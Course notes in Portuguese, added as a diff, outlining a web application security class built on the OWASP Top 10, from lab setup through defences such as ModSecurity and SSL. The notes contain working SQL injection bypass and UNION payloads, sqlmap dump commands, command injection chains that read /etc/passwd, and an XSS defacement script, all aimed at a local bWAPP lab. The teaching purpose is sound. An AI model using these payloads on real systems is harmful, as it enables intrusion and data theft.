@@ -1,0 +1,328 @@
+- Seção 1: Introdução
+  
+	- Introdução
+		-  Porque estudar Segurança em Aplicações WEB?
+		-  As vulnerabilidades mais exploradas são conhecidas e possuem soluções documentadas, porém não são implementadas corretamente nas aplicações
+			-  O número de aplicações Web estão crescendo constantemente
+			- As soluções para os problemas relacionados a segurança são simples, só dependem de conhecimentos sólidos
+			  
+	- O que você aprenderá neste curso?
+		-  OWASP Top 10
+			-  Injeção
+			- Autenticação
+			-  Exposição
+			-  Referências a XML
+			-  Acesso ao Sistema
+			-  Configurações incorretas
+			- XSS Scripts
+			- Desserialização
+			- Componentes vulneráveis
+			- Registro e monitoramento insuficientes
+			  
+	- Como vamos estudar neste curso?
+		- Apresentação do curso
+		- Criação do Laboratório de Estudos
+		- Princípios da Segurança da Informação e Proteção de Dados
+		- Testes realizados em ambientes Web
+		- Injeção SQL
+		- Local/Remote File Injection
+		- Code Injection
+		- Command Injection
+		- XSS/Cross Site Scripting
+		- Mecanismos de recuperação de senhas vulneráveis
+		- Curso prático com laboratório de testes
+		- Voltado para profissionais de segurança e desenvolvedores
+		- Exercícios práticos em cada módulo
+		- Aplicação em ambientes reais
+		- Possiblidade de renda extra com aplicação do conhecimento do curso
+		- Como estudar neste curso?
+			-  Aulas práticas
+			- Assista as aulas e faça os exercícios durante as aulas
+			- Pergunte sempre tiver dúvidas
+			- Execute todos os exercícios
+			- Utilize a função Split
+			- Utilize a Udemy a seu favor
+			  
+	- Configuração do Laboratório de Estudos
+		- Virtual Box
+
+- Seção 2: Princípios da Segurança, Testes de Vulnerabilidades, Ferramentas e Documentação
+  
+	- Princípios da Segurança da Informação
+		- Autenticidade
+		- Confidencialidade
+		- Disponibilidade
+		- Integridade
+		  
+	- Análise de Vulnerabilidade e seus tipos
+		- A análise de vulnerabilidades é similar ao pentest, pois se trata de uma auditoria completa buscando encontrar possíveis falhas de segurança
+		- Em uma análise de vulnerabilidades busca*se sempre manter a integridade do sistema auditado, logo, sua intenção é a correção das vulnerabilidades encontradas
+		- Toda aplicação possui vulnerabilidades, cabe a nós encontrá*las e corrigi*las
+		- Tipos
+			- Black box
+				- Sem conhecimento da estrutura
+			- White box
+				- Com conhecimento da estrutura
+			- Gray box
+				- Conhecimento parcial
+				  
+	- Planejamento da Análise de Vulnerabilidades
+		- Informações gerais
+		- Contrato de acordo
+		- Objetivo da análise
+		- Limitações
+		- Linha do tempo (relatórios)
+		- Fases
+			- Reconhecimento (Footprint)
+			- Varredura (Scanning)
+			- Exploração (Gaining Access)
+			- Escalação de Privilégios (Maintaining Access)
+		- Metodologias
+			- OSSTMM (Open Source Security Testing Methodology Manual)
+			- ISSAF (Information Systems Security Assessment Framework)
+			- WASC*TC (Web Application Security COnsortium Threat Classification)
+			- OWASP (Open Web Application Security Project)
+			  
+	- Arquitetura de Aplicações WEB
+		- Cliente
+			- Navegador de internet
+		- HTTP Response
+		- HTTP Request
+		- Servidor Web
+		  
+	- Projeto OWASP e Ferramentas
+		- Esta metodologia é direcionada para testes em servidores e aplicações web. A OWASP mantém uma lista das principais vulnerabilidades para web
+			- Injeção
+			- Quebra do sistema de autenticação
+			- Directory Transversal
+			- File upload
+			- Configurações falhas
+			- CSRF
+			- Negação de serviço
+		- OWASP BWA
+			- VM para estudo
+			- Segurança de aplicações web
+			- Técnicas de enumeração manual
+			- Ferramentas automatizadas para enumeração
+			- Ferramentas de análise de código fonte vulnerável
+			- Ataques na web
+			- WAFs e tecnologias de código similares
+		- OWASP ZAP
+			- Ferramenta de segurança gratuita
+			- Proxy que facilita a realização de testes de intrusão em aplicações web 
+			  
+- Seção 3: Testes de Vulnerabilidade e Injeções diversas
+  
+	- SQL Injection - Introdução
+		- SQL Injection
+			- O SQLi é um método utilizado para extrair ou modificar dados em um banco de dados disponível em um sistema, geralmente Web
+			- O SQL foi projetado para gerenciar dados 
+			- Qualquer site que esteja armazenando dados o faz com banco de dados
+				- Fáceis de evitar
+		- username=admin
+		- password=1234
+		- SELECT usrrname FROM tableusers WHERE password='1234'
+		  
+	- SQL Injection - Quebra de autenticação
+		- SELECT username FROM accounts WHERE username=''';
+		- SELECT username FROM accounts WHERE username='admin' or '8' = '8';
+		- admin' or '8' = '8
+		- ' or '8' = '8
+		  
+	- SQL Injection - Exploração de Dados
+		- order by
+		- SELECT username FROM accounts WHERE username='admin' order by 1,2,3
+		- SELECT * FROM accounts WHERE username='admin' order by 1,2,3 AND password=''
+		- SELECT * FROM accounts WHERE username='admin' order by 1,2,3 -- AND password=''
+		- admin' order by 1,2,3 -- 
+		- admin' order by 100 -- 
+		- admin' order by 7 -- 
+		- information_schema
+		- SELECT * FROM information_schema WHERE username='admin' AND password='admin'
+		- SELECT * FROM accounts WHERE username='admin'  UNION SELECT 1,2,3,4,5,6,7 FROM information_schema.columns WHERE table_name='accounts' -- 
+		- SELECT * FROM accounts WHERE username='admin'  UNION SELECT 1,database(),3,4,5,6,7 FROM information_schema.columns WHERE table_name='accounts' -- 
+		- SELECT * FROM accounts WHERE username='admin'  UNION SELECT 1,column_name,3,4,5,6,7 FROM information_schema.columns WHERE table_name='accounts' and table_schema='nowasp' -- 
+		  
+	- SQL Injection - Testes com SQLMAP
+		- SELECT movie FROM tablemovie WHERE moviename='iron'
+		- ' order by 1,2 -- 
+		- ' order by 7 -- 
+		- ' union select 1,2,3,4,5,6,7 -- 
+		- teste' union select 1,2,3,4,5,6,7 -- 
+		- teste' union select 1,database(),3,4,5,6,7 -- 
+		- teste' union select 1,table_name,3,4,5,6,7 FROM information_SCHEMA.tables WHERE table_schema=database() -- 
+
+	- SQL Injection - Testes no BWAPP
+		- teste' union select 1,column_name,3,4,5,6,7 FROM information_SCHEMA.columns WHERE table_name='users'  AND table_schema=database() -- 
+		- teste' union select 1,login,password,email,secret,6,7 FROM users -- 
+		  
+	- Instalação OWASP ZAP
+	  
+	- SQL Injection - Testes automatizados
+		- sqlmap -u "https://10.0.2.5/bWAPP/sqli_1.php?title=iron&action=search" --proxy=http://127.0.0.1:8080 --cookie="PHPSESSID=vud4f9tcq76re3rvjoqies42g2; security_level=0" 
+		  
+	- SQL Injection - Testes com SQLMAP
+		- sqlmap -u "https://10.0.2.5/bWAPP/sqli_1.php?title=iron&action=search" --proxy=http://127.0.0.1:8080 --cookie="PHPSESSID=vud4f9tcq76re3rvjoqies42g2; security_level=0" --dbs
+		- sqlmap -u "https://10.0.2.5/bWAPP/sqli_1.php?title=iron&action=search" --proxy=http://127.0.0.1:8080 --cookie="PHPSESSID=vud4f9tcq76re3rvjoqies42g2; security_level=0" --current-db
+		- sqlmap -u "https://10.0.2.5/bWAPP/sqli_1.php?title=iron&action=search" --proxy=http://127.0.0.1:8080 --cookie="PHPSESSID=vud4f9tcq76re3rvjoqies42g2; security_level=0" --tables -D bwapp
+		- sqlmap -u "https://10.0.2.5/bWAPP/sqli_1.php?title=iron&action=search" --proxy=http://127.0.0.1:8080 --cookie="PHPSESSID=vud4f9tcq76re3rvjoqies42g2; security_level=0" --dump -T users -D bwapp
+
+	- XSS - Introdução
+		- É uma vulnerabilidade presente em aplicações web que permite que o cibercriminoso insira códigos Javascript para obter certos tipos de vantagem sobre as vítimas
+		- O Cross-Site Sceripting (XSS) é normalmente aplicado em páginas que sejam comuns a todos os usuários, como por exemplo  a página inicial de um site ou até mesmo páginas onde usuários podem deixar seus depoimentos. Para que o ataque possa ocorrer é necessário um formulário que permita a interação entre o atacante, como por exemplo em campos de busco ou inserção de comentários
+		- O servidor A pertence ao "mibanco.com" 
+		- O atacante que consegue injetar um código malicioso no site por meio da exploração da XSS. O código faz o usuário ser redirecionado para outro site exatamente igual
+		- Ao executar o código malicioso, estará registrando os seus dados no site clonado
+
+	- XSS - Alterando conteúdo do site
+		- <script>
+		       document.body.innerHTML="";
+		       var imagem=new Image();
+		       imagem.src="<Insira o URL da imagem>";
+		       document.body.appendChild(imagem);
+		  </script>
+	
+	- XSS - Configuração Beef
+	
+	- XSS - Capturando informações da vítima
+
+	- Command Injection
+		- Se esta vulnerabilidade existir, é possível executar comandos diretamente da aplicação, conseguindo acesso não autorizado ao sistema
+		- nslookup www.google.com.br
+		  
+	- Command Injection - Explorando o servidor remoto
+		- www.google.com.br && ls
+		- www.google.com.br && pwd
+		- www.google.com.br && id
+		- www.google.com.br && whoami
+		- www.google.com.br && ls -la
+		- www.google.com.br && cat /etc/passwd
+		- www.google.com.br && uname -a
+		- www.google.com.br && cat /etc/*-release
+
+	- Command Injection - Commix
+		- commix -u https://10.0.2.5/bWAPP/commandi.php --cookie='PHPSESSID=km14r31nob652asujhnrvn6mb3; security_level=0' --data='target=10.0.2.5&form=submit'
+
+	- LFI - Directory Traversal
+		- Local File Inclusion )LFI) é o processo de inclusão de arquivos, que já estão presentes localmente no servidor em questão. Esta falha ocorre, por exemplo, quando uma página recebe como entrada, o caminho para o arquivo que será incluido, e esta entrada não é validada de forma correta pela aplicação web, possibilitando que caracteres de Directory Traversal sejam injetados
+
+	- Avançando com LFI
+		- C99 Shell
+
+	- RFI - Envio de PHP Shell
+
+	- RFI - Execução Shell PHP
+
+	- RFI - Exploração do Alvo
+		- Weevely
+
+	- RFI - Alteração de Dados
+
+	- Revisão TCP/IP
+		- Cliente-servidor
+		- TCP3 war handshake (SYN, SYN ACK, ACK)
+		- Client: HELLO
+		- Server ACK -- Server: HELLO
+		- Client: ACK
+		- Server: x509 Certificate
+		- Shared Key Exchange - Encripted Handshake
+		- Application Data
+
+	- Denial of Service - SYN Flood com hping
+		- Trata-se de um ataque de negação de serviço onde o objetivo é indisponibilizar o servidor alvo
+		- hping
+
+	- Denial of Service -Mais testes com hping
+
+- Seção 4: Transporte inseguro e mecanismos de recuperação de senhas vulneráveis
+
+	- Análise de Tráfego não criptografado
+		- Arquitetura básica de uma aplicação 
+- 
+	- Transporte Inseguro na Web
+		- Citada na OWASP como uma vulnerabilidade importante, grande parte das informações trafegadas na WEB não é criptografada
+		- Conseguimos interceptar os dados, e capturar informações 
+		  
+	- Comunicação criptografada com SSL
+		- Captura de pacotes de dados por meio de Sniffers
+			- Sniffers são uma categoria ampla de aplicações que englobam qualquer utilitário que tenha a capacidade de executar uma função de captura de pacotes
+			- O sniffing passivo é considerado ser todo o tipo de sniffing onde o tráfego é olhado mas não alterado em nenhuma maneira
+			- No sniffing ativo, não só o tráfego é monitorado, mas também pode ser alterado de alguma forma, como determinado pelo atacante
+			  
+	- Brute Force - OWASP ZAP
+		- O brute force é aplicado para conseguir acesso a contas em determinado site, serviço, desktop ou servidor por meio de tentativas de login e senha, até que se escalone os privilégios. A força bruta pode ser aplicada tanto manualmente quanto automaticamento, por meio de softwares
+		- Ferramentas
+			- Hydra
+			- xHydra
+			- Cewl
+			- Owasp ZAP
+			   
+	- Brute Force - CEWL
+	  
+	- Brute Force - Hydra
+
+- Seção 5: Métodos de descoberta automática de vulnerabilidades
+	
+	- OWASP ZAP
+		- O OWASP ZAP possui a funcionalidade de nos mostrar automaticamente várias vulnerabilidades
+		  
+	- Nikto
+
+	- WPScan
+
+	- Wapiti - Instalação e primeiros comandos
+	  
+	- Verificações avançadas com Wapiti
+	  
+	- GoLismero - Instalação e primeiros comandos
+	  
+	- Verificações avançadas com GoLismero 
+
+- Seção  6 Métodos para proteção
+
+	- Introdução
+
+	- Proxy de Aplicação
+		- Camada de proteção entre servidor e internet
+		- Versão elaborada de filtragem de pacotes
+		- Proxy Reverso
+		- Analisa todos os dados da aplicação de um pacote
+		- A filtragem de pacotes passa um pacote que foi permitido. O mesmo pacote viaja entre a internet e o computador da rede interna. Um proxy de aplicação gera novamente um pacote através de um pacote que foi permitido. Ele constrói um novo pacote e envia do firewall pro servidor da internet
+		- Apache e Nginx
+
+	- Modsecurity
+		- O Modsecurity é um Firewall de Aplicação WEB que é considerado um kit de ferramentas para monitoramento, registro e controle de acesso de aplicações web e tempo real
+		- Open source e cross platform
+			- Pode rodar em servidores Apache, Nginx, IIS etc.
+		- Por meio de regras este WAF consegue proteger as aplicações web de várias ameaças 
+		- Princípios 
+			- Flexibilidade
+			- Passividade
+			- Previsibilidade
+			- Qualidade acima de quantidade
+		- Protege as aplicações web através da sua poderosa linguagem baseada em regras
+
+	- Configurando WAF
+	  
+	- Criando certificado SSL Self-Signed
+		- HTTPS
+			- HTTPS é uma implementação do protocolo HTTP sobre uma camada adicional de segurança que utiliza o protocolo SSL/TLS. Essa camada adicional permite que os dados transmitidos por meio de uma conexão criptografada e que se verifique a autenticidade do servidor e do cliente por meio de certificados digitais
+		- Wireshark
+		- O que é um certificado SSL?
+			- SSL significa Secure Sockets Layer, uma tecnologia global de segurança padrão que permite a comunicação criptografada entre um navegador da internet e um servidor da web. É utilizado por milhões de empresas on-line e indivíduos para reduzir risco de roubo ou adulteração das informações confidenciais por hackers e ladrões de identidade. Na essência, o SSL permite uma conversa privada entre duas partes interessadas
+		- Tipos de SSL
+			- Único
+			- Coringa
+			- Multidomínio
+		- Tipos de validação
+			- Validação de domínio
+			- Validação da organização
+			- Validação estendida 
+			  
+	- Configurando certificado SSL Self-Signed
+	  
+	- Defendendo-se no código
+		- https://developers.google.com
+		- https://developer.mozila.org
+		  
+	- Fontes de informação sobre vulnerabilidades
